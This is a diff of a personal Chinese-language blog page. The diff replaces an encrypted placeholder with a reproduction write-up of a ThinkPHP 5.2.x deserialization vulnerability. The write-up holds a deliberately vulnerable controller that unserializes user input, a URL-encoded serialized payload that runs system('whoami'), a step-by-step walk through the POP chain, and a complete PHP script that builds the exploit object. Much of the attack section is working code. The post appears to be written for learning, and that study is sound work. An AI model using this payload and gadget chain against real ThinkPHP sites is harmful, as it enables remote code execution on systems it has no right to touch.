@@ -11,18 +11,28 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="referrer" content="no-referrer">
   <!--more-->
-  <meta name="description" content="还没写完呢">
+  <meta name="description" content="这两天跟着七月火师傅的blog复现了几个tp5的sql注入漏洞，自己也不知道是否真的消化了，慢慢来把，今天跟着力哥复现下tp5的反序列化漏洞">
 <meta name="keywords" content="反序列化,tp,代码审计">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ThinkPHP5.2.x反序列化复现">
 <meta property="og:url" content="https://glotozz.github.io/2019/10/06/ThinkPHP5-2-x反序列化复现/index.html">
 <meta property="og:site_name" content="低效率的勤奋是鸦片 | glotozz&#39;blog">
-<meta property="og:description" content="还没写完呢">
+<meta property="og:description" content="这两天跟着七月火师傅的blog复现了几个tp5的sql注入漏洞，自己也不知道是否真的消化了，慢慢来把，今天跟着力哥复现下tp5的反序列化漏洞">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-10-08T01:22:02.552Z">
+<meta property="og:image" content="https://i.loli.net/2019/10/09/4nIdTHSwK7WLCmM.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/08/TdBOgv84URN1MPr.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/08/ovDjMPmp8zu6SAb.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/08/6ntoSAJp52FZ7Gg.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/08/YaeEScqnbhktgN3.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/08/5nJSB3MlOPIyaL4.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/08/7iGJlBDI4yM5uZO.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/08/1tnbOkUJjaFcyAK.png">
+<meta property="og:image" content="https://i.loli.net/2019/10/08/va5J12cbWjmtBCY.png">
+<meta property="og:updated_time" content="2019-10-08T23:45:10.384Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ThinkPHP5.2.x反序列化复现">
-<meta name="twitter:description" content="还没写完呢">
+<meta name="twitter:description" content="这两天跟着七月火师傅的blog复现了几个tp5的sql注入漏洞，自己也不知道是否真的消化了，慢慢来把，今天跟着力哥复现下tp5的反序列化漏洞">
+<meta name="twitter:image" content="https://i.loli.net/2019/10/09/4nIdTHSwK7WLCmM.png">
   
   
     <link rel="icon" href="https://raw.githubusercontent.com/glotozz/images/master/bitbug_favicon.ico">
@@ -171,15 +181,86 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <div class="hbe-input-container">
-  <input type="password" id="hbePass" placeholder="Hey, password is required here." />
-    <label for="hbePass">Hey, password is required here.</label>
-    <div class="bottom-line"></div>
-  </div>
-  <script id="hbeData" type="hbeData" data-hmacdigest="8fce3a3b9c11fde0e1c4ff0b49732e2246d5f501a6c0ed72ae057c172aa36aa7">96792a6f0e092430531340884cbe931dbd006084cf1b6efb81b3cc62706be7f50110a0d5230b88eeeff7475d93911e13ef62e999fb73f8bf37b7e27a0e00beed6a7a7141df11890376a19955e100146c9c7623b4deffe552cdb52097ed0027b3f03530e3050cfafdd15f9230a0bfcaed92a816b3ac5267aff82c7c2d83976ffc3f603a8bdc382a6cf6818606f13940aa745adc833729e7adb31a50b662c050893d03b5970e1ffbf46de712e7ae731783cd471558aab13c7ef1be5de868c3342f42c5e655f6ae0ec3fe6bb55d654b29704ff2eb896115225102b7d58ba2fa013f681eed1205a168ef648c80e6d4069b41a913df818d6f388d3a98e0742de873b245384cc62f44f14271acaf138ffa9ad2dd8e86f2369ff06ad3bf3da68b2a55c444ae61dbe687748d18e5c2d9c1bae963ca37e9a5c971f2cffef78e3784712eda05774fe20b5b97ace11623a57dcbe25a710c1c5f815f5bf6d1b4c03622bfde961e112d7536ed8a711baed9e2a428af88dde7f3fda918195d40792cfc66d99c5341d683d7cc1c8d8e619c3a5c71f23095022e7a4eb19ba519f895acf418e61d856b4d1824a1f232e08e5894fa96554893587c11fcef8e4f0eac33959d3643d80a92f8d935c2e59ae67e98ef2e5706faccc4bcaa914287383e0f457417bc6e32a38317aeea577f1f120d9188aaf492c96ec21b1cba5048199f0cd613339bb0d8f0ef743d5d20b44420211353d5bb0a6f24c8ff4fc0609ca6b30d885d67bcb9b7d07236a10b03836353532f60ed1d59eccbdfecd6ceeb1b276b3c86d99da2d81aa96c46448077465284cf9a5a14d85698b7d47355064ef0b7acfda003d1aaf568a25501b1fcf80c940538603ded87e80205a23011fcf68821e7ffcecb02f9f267763a9628c0fc9691c8eebdf7eca21f5ad5992cdb9d83e2603f36c46d850a161fa4c48b7beee6f875b6cac4e859b17d33b714c55061db776663638192828a6c7baa5d47d87b3129dcb9cc5d2270adf3d0f27b5903cded90a39860c2d06bcf532f75420986bc0ce3e5fdc2fa99ce86e2e62558aa4a9aa22a3ce68499338ed20c672a0007808f0e8b70fc6f8f68fe3f975127bfd36b6bfbdd3d21ff7d1313d094de3ffe97fcc3302a3b662b8ada78870a110a2ae3eddd97457538038c036474953ea9b8f8cb11d6df5ae7e45a77fdd2d0b3985edfd8a79270cfd1e80517da4a9e1a11742a22d13f80edb98920d56659ea0ce90a96b8be617438fd7fcf59e3eed0375c3d40738a13a51657b1067b5fdb6df3169b0aaffa52dde5df502dbc3aa760b065e37977592870b673d5deaebc21b4533185ab6d5e0d32d0c9338f3997f160585a9fc7e2d56890cae7e9e6924b2ad7308f99217e03adf6826f21f6517e5782d34dfd3442970276ae5b1026f23ef88c8710ba060a14497a529ccedcc6109d951b5e828b8c13f6a9fcc97ed1337bcae623cbee931303a84ed9acf3c4d5e89c8e9426af6e47b9ff3bf9a0447a7390a5d6ace3b9eae4aa83641882a4f660587592873f3a507acf3ae85ce2d9c2f2ae87c49f2e642cba18f2b40515504aafcc83d2d5f119863f14ddd420af20d8ad7975e557a63d138caccd41dedbc5551b9b9345a35bcdf1cecd96cf336cf2f5774f75fa0b67519130c1631f743aa17369aeb3a37233e35a4ebed8e47d3f9f2aae7c190bc7bd962534d7613ea5bb63f57961763552e9fdcee896ae8426628674fbe58b4aaf73ab087d5b8f2be552766933fc8872ef7327f5610387ca23a658513118b23ffcb88eb4758983e845466588ba0c149c5eb2f1bc77f68c01cc244855dd9c8e3bfa1cec6aee4e6cff1da76db0bdd6e0e0f3359da3aee09ce9b1ecb5c7a1b86f7a47127f2bc92662a8156455266b619dc9ed0e9a54c9ebb4c85d61f6bf09b9b98f252038b0b453ccfd390446f1a068257c4ccaeceffe2641f115ba93d7260c59d4790edca66ceb77564173625a85f3da15a51e7c04141890aebdaf719d3a5c7b3e40fa030757032fefde976dee92e4b9c4402364b75ed18a7ae480220e0c18dfb77845799dd21da18f1d8df031bdb1f8c9d4c2bc702403f0528a5557101b8f93cad1e143eefacb1a8ade9829dc72b83ce7afb5148268d452751a443ecc5fb6a1afb696b3d9b0745511b371aa7c56d9548e9763131a21732a66ed652473365fab14453af6141df797038791e44ca3f8584a2cd33a4c24cdc159bcd1ef63b28627c39b28255641ee1001dac759b146f7a4306678ae20a96b322645835ed0dbfd5961d63d384a6566aa21b41147908faefe697c4b5ecfb14ff208250d401a7b821869750b0f74f7d133ed7549e46a7dc8dc7a73c04985fe24f1baa3bbae23807ba905968c2a4e4bfae0afc187ff5d0d11087dac7b68b3a73ed2b51bd1a55d71958fce04cfe2a60d6d0175eedd99f29bd34e927fe8dfdc4d449806bbbc2782e0006bfaa05cbfc0850d2f2ed45c9157906f49ed04a17b240cac47e902519701d5b13ff2eb20459fd9d725050522558411e61f4e9727f1a65760540c819df19b336ad0cdc9b7ea4719b8de1d69f6b9b6ad201f1159c5aa7d0e0188fcb01c850902f99035dd29b6a9df85e47be7f846ac0f7484091fd57b4cce6bb322721bc3040340e1487e26a172974fdf793d7235bd2401598f17568a87f0c610049609ff8ee1780b030fa6d3661ea6c38160404ba608a2ec5061da4eff47901d3cfbd0623d001735a7f3ae61ab47b5b4d216bd1a8e4ae2b1f2df9a1ea74fcceb7729e1f3b39c105393fbabde14c1d4baf8cc2d35c3cfc1ca35659eb086039243d1591159317a10d35c166f9c92496c252933998086cca81590c33197e6633565910a4097c86f032c9489656a45c0638fac88a12b6dd7404c4cfe949f4cd9396f33c51dfc4511248666f858ae0595efd9ba9fc438a77f6a4d0d4bde409f145c62c02c50aebca0a3dc835b7e72c6b748b9b78631c33967073222e08541570b023aac38ef17feacbc97d3a7c3cf755d470b5410840fbf92b3daf01b2a828652dae68cd8003f391980352e0c86d962fc76303282136889dc2d2d18159fe8e01378a0c4a2764174cf12df38ddb82e888c1c6e6bfbf0bd65dc7045f6abedeb1cef47e96fc645a7be4c9f8671f70a3ab267adf36c5dd1d6a3b276ad445b3ccbb3c7809ec95516fce7fe254e2f885f5e736988e483aa70ebbca7875691de50da432b755eaae5ef431e1cecb0e80f170a338a6ed533820c3b96ad9c21c6d355f6ad8598bfa0daa8c6ae00e248249be80b08985fa848f71885ca91acdd4c8af4847878565f8babd77ff7a0f8e3b0a116d90c94c04ea65af09474122a591b9531e8dfd006c029689747d8f434c9ec6910cf888e3ffa18dcdf6a8ad9454751e412dfbd99132af2065e4e44c0d355baa1278dff9390ae572db1c043b1d1b624930c1d151e2083776def09603d69dd7a3a8a1cafc52375bb3011cd67d52922e84e6aa6caa49b61b7417857667a6c57adf66525c28c2dd8ab0d9083c882f167b58a90145ec9d9fb3bc915786e695716f72edf6baa05fd45781e6852a09e32c8ec12bed797ff6b8c1c2e9b94ab3da7f0d10ab6bad538e0762dca190d4d4e052457e78d71e66643e466b491e2b716aa24c390a4045d2a4160b66dc7a395e00f18dc3fcae169bcfeb84a58c800907a45bc4e5a94bd74a5d27d1bbebdbef2856c050580405a7547c9719de74ebcaea271766d511cb560043be07d935b0685e7911a9955ecd188ae3c06012841a6c69528e4eab6bad7857f71d6c7effb5e826e3227cb9f5c9727b53867454e59a6eec9d3d2821266b48fc750d68a855ea899e9f968ffe0ed3007c8380342bedacd44d2698286242d5fae1629c81efb9b82c294eb76113a8afb52ed4e1fb6e0ee0daa1df110b4340f410a983e3a4532ecd1f7a8c39bc6eccda8ed8e71c1d37f1d33d51312ea90b2f9869c83e006f2d7f82b360c1f229d8fb0695bdcd693b9ccf68c2388e66cc714a3d33f7533ad1e3af88418c85ecd8ffbc64359a1b3b9de73ff1ced62d8686b9948a4fa0ca3482ec06d7ce8fd4924397e64f4f1cf3ecdc848ca66a384a89478867db5181251a213c60c0094ac62fc9e7eb176ea16f7a5c905a483d288a58203fcd9cbb99bd10fa85ca7bcc86108f91ce9dcce4869d75128e7056ec4e31dc3c8eec4c41699bb930cb0cd5cb5d81054e3ddb5df0a8ee2d03400f25b79ce9b4e238099feb1a9130158461473fb7da1c4ef5c10151f391a901134389d867468faaec197e737ff51e8b275688827fd3899a4496f56ac71aab1147d8e5c68779b349fb740773a1a57281a8019461091aa996066e71c14ed4cb1897b50763cfde38ce4530357733afbaf16d1169aefe5b9104835e722ab355c7b1ad803c40951f155ef5891ed9414e70bf82fb5848511fcb7c1861235ed3afc8eaf11290324900a711988957dcb7f71240b4cddb13d8ada8a99678a7fcd95996ffaabca6c53aacb4852aab9f0781cd02b595c37620bc080718134ce47979ced2fcfecd239749ce4467fb159cbed892ffda501cb0efc282112eac6dfdf072045c43087ade1006637061701ca6eb82148d7b6b58c2a8b03bb004ce49f0c75779894ac9709bed7f9a0d0f2e860a24379059294ae907e404e1d8b9fd9787b449134e399dc0fd7e0eff970a8892e508fb98b0cf215850bfdccc2b45c33481b8f48aad081c8edfca3c95d319d7d3bc63a43b432775d8102b5abbd4446142c204c0c4e1bcac5efc9df9bb76d6aeb6c31b6484187b2aa47912acb31d4b14eaf8275fb8edbeb40710a5d741aaf311732836d09a10297f27e0c4096d62e1ab1b22bd17edfd6e3b779bb9832adf885af531a67aab0cad30d1e8baf9ae8c4a1ddaf2fc1d8f9e6d26d2992822dc7c783346af5f54702f1d0c67f58df7c43920e76d1a9890fda91828f3437c2cea2c5f34ac87cffa54b7138819bdf7512fbd812592c5bf2033b98deb3485aaf294b94a464faa358b051fcf56e6db042937fe190b13af02ecc86ba9db043175375554618f375275fde67e191d84671f0969dbf2371d6b89d7f0865d590f47bbbb440e09e9d2362b08b655940529f5e9d3a75dec2bee780c8c61895f72403ba3092cd67123f4297186271f67d5540c2d7ff3218778c67ece5f4a5f561cfce7b4e96186e00e86eadbb69f73ed4e75517ca2740bfbc7c4e8aee3b0c913d9704715216f1880ce26829197fa0d9d8de988bf27e066af62a76d205eb4f8e1d6a6328f11753d7f5510722f1c7ffb81242e540df5e7da8a7a35010175aaf73d652db147e0c001c44c57d0cb6b369c8c666ad59a7afd4a86129dab8d210413edbd28100d062004d76ddb1db5254d35c93c9e3e3271f7daeaa644af85a36dc248750d2ae1493874bb410bc61f01b44e1d064d1ba3cf426babc0c4f22cd461dea84b60f329c3c9a30ea0593</script>
-</div>
-<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">
+        <blockquote>
+<p>这两天跟着七月火师傅的blog复现了几个tp5的sql注入漏洞，自己也不知道是否真的消化了，慢慢来把，今天跟着力哥复现下tp5的反序列化漏洞</p>
+</blockquote>
+<meta name="referrer" content="no-referrer">
+<a id="more"></a>
+
+<h4 id="一、获取漏洞"><a href="#一、获取漏洞" class="headerlink" title="一、获取漏洞"></a>一、获取漏洞</h4><p>ThinkPHP5.2.x</p>
+<p>获取测试环境代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink/think=5.2.x-dev tpdemo</span><br></pre></td></tr></table></figure>
+
+<p>修改app/controller/Index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace app\controller;</span><br><span class="line"></span><br><span class="line">class Index</span><br><span class="line">&#123;</span><br><span class="line">    public function index($input=&apos;&apos;)</span><br><span class="line">    &#123;   </span><br><span class="line">        unserialize($input);   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>启动</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd tpdemo</span><br><span class="line">php think run</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>tp5.2.x和tp5.1及tp5.0好像有点不一样，我直接访问提示控制器不存在:app\controller\Tpdemo，</p>
+<p>换一种启动方式，这种感觉和flask有点像😁</p>
+</blockquote>
+<h4 id="二、漏洞实现"><a href="#二、漏洞实现" class="headerlink" title="二、漏洞实现"></a>二、漏洞实现</h4><p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input=O%3A27%3A%22think%5Cprocess%5Cpipes%5CWindows%22%3A1%3A%7Bs%3A34%3A%22%00think%5Cprocess%5Cpipes%5CWindows%00files%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A17%3A%22think%5Cmodel%5CPivot%22%3A4%3A%7Bs%3A21%3A%22%00think%5CModel%00relation%22%3Ba%3A0%3A%7B%7Ds%3A10%3A%22%00%2A%00visible%22%3Ba%3A0%3A%7B%7Ds%3A21%3A%22%00think%5CModel%00withAttr%22%3Ba%3A1%3A%7Bs%3A7%3A%22glotozz%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A17%3A%22%00think%5CModel%00data%22%3Ba%3A1%3A%7Bs%3A7%3A%22glotozz%22%3Bs%3A6%3A%22whoami%22%3B%7D%7D%7D%7D</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2019/10/09/4nIdTHSwK7WLCmM.png" alt="Snipaste_2019-10-09_07-40-19.png"></p>
+<h4 id="三、漏洞分析"><a href="#三、漏洞分析" class="headerlink" title="三、漏洞分析"></a>三、漏洞分析</h4><blockquote>
+<p>复现完之前tp5.1反序列化漏洞，前面的pop链不变</p>
+</blockquote>
+<p>反序列化入口</p>
+<p>Windows类-&gt;__destruct()-&gt;removeFiles()-&gt;file_exists()-&gt;<em>\</em>toString()</p>
+<p>如果我们传入的$files为对象，该__toString()将会被调用</p>
+<p>Conversion类-&gt;__String()-&gt;toJson()-&gt;toArray()</p>
+<blockquote>
+<p>之前tp5.1.x是利用类似$val-&gt;visible($this-&gt;visible[$key]);去调用__call()</p>
+</blockquote>
+<p>toArray()</p>
+<p><img src="https://i.loli.net/2019/10/08/TdBOgv84URN1MPr.png" alt="Snipaste_2019-10-08_22-54-22.png"></p>
+<p>这里关注getAttr()和getValue()</p>
+<p><img src="https://i.loli.net/2019/10/08/ovDjMPmp8zu6SAb.png" alt="Snipaste_2019-10-08_22-36-09.png"></p>
+<p>跟踪getValue()</p>
+<p><img src="https://i.loli.net/2019/10/08/6ntoSAJp52FZ7Gg.png" alt="Snipaste_2019-10-08_22-40-51.png"></p>
+<p>$closure=$this-&gt;withAttr[$fieldName];</p>
+<p>withAttr是一个我们可控的数组。。。$fieldName跟踪一下</p>
+<p><img src="https://i.loli.net/2019/10/08/YaeEScqnbhktgN3.png" alt="Snipaste_2019-10-08_22-46-10.png"></p>
+<p>我们也是可控的，我们控制$closure为system</p>
+<p>那么只需要解决$value</p>
+<p>追踪一下，熟悉的getData()</p>
+<p><img src="https://i.loli.net/2019/10/08/5nJSB3MlOPIyaL4.png" alt="Snipaste_2019-10-08_22-38-28.png"></p>
+<p>$data是我们可控的，fieldName也是可控的。那么继续往前看</p>
+<p>也就是toArray()函数中的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$item[$key] = $this-&gt;getAttr($key);</span><br></pre></td></tr></table></figure>
+
+<p>$key是$data数组的键，而</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = array_merge($this-&gt;data, $this-&gt;relation);</span><br></pre></td></tr></table></figure>
+
+<p>这两个数组我们也可控😁</p>
+<blockquote>
+<p>然后是具体构造exp的一些细节</p>
+</blockquote>
+<p>Conversion是trait类型的，不能实例化，通过use来使用，搜索定位到Model类，</p>
+<p>发现__construct()构造方法中传入$data数组</p>
+<p><img src="https://i.loli.net/2019/10/08/7iGJlBDI4yM5uZO.png" alt="Snipaste_2019-10-08_23-05-36.png"></p>
+<p>然而Model是抽象类，也不能实例化，寻找一个子类，找到Pivot类</p>
+<p><img src="https://i.loli.net/2019/10/08/1tnbOkUJjaFcyAK.png" alt="Snipaste_2019-10-08_23-09-24.png"></p>
+<p>这里构造方法调用了父类构造方法</p>
+<p><img src="https://i.loli.net/2019/10/08/va5J12cbWjmtBCY.png" alt="Snipaste_2019-10-08_23-10-39.png"></p>
+<p>那么构造exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes &#123;</span><br><span class="line">    class Windows&#123;</span><br><span class="line">        private $files = [];</span><br><span class="line">        function __construct($files)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;files = $files;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model\concern &#123;</span><br><span class="line">    trait Conversion&#123;</span><br><span class="line">        protected $visible;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    trait RelationShip&#123;</span><br><span class="line">        private $relation;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    trait Attribute&#123;</span><br><span class="line">        private $withAttr;</span><br><span class="line">        private $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think &#123;</span><br><span class="line">    abstract class Model&#123;</span><br><span class="line">        use model\concern\RelationShip;</span><br><span class="line">        use model\concern\Conversion;</span><br><span class="line">        use model\concern\Attribute;</span><br><span class="line"></span><br><span class="line">        function __construct($closure)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;data = $closure;</span><br><span class="line">            $this-&gt;relation = [];</span><br><span class="line">            $this-&gt;visible= [];</span><br><span class="line">            $this-&gt;withAttr = array(&quot;glotozz&quot;=&gt;&apos;system&apos;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\model &#123;</span><br><span class="line">    class Pivot extends \think\Model&#123;</span><br><span class="line">        function __construct($closure)</span><br><span class="line">        &#123;</span><br><span class="line">            parent::__construct($closure);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace&#123;</span><br><span class="line">    $pivot = new think\model\Pivot([&apos;glotozz&apos;=&gt;&apos;whoami&apos;]);</span><br><span class="line">    $windows = new think\process\pipes\Windows([$pivot]);</span><br><span class="line">    echo urlencode(serialize($windows));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Windows类-&gt;__destruct()-&gt;removeFiles()-&gt;file_exists()-&gt;__toString()</p>
+<p>如果我们传入的$files为对象，该__toString()将会被调用</p>
+<p>Conversion类-&gt;__String()-&gt;toJson()-&gt;toArray()-&gt;getAttr()-&gt;getValue()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value   = $closure($value, $this-&gt;data);</span><br></pre></td></tr></table></figure>
+
+<p>动态函数执行。</p>
+<blockquote>
+<p>力哥tql👍</p>
+</blockquote>
+<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2反序列化/" target="_blank" rel="noopener">https://zhzhdoai.github.io/2019/10/02/ThinkPHP-5-2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p>
+<p><a href="https://www.anquanke.com/post/id/187332#h2-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/187332#h2-2</a></p>
+
       
 
 
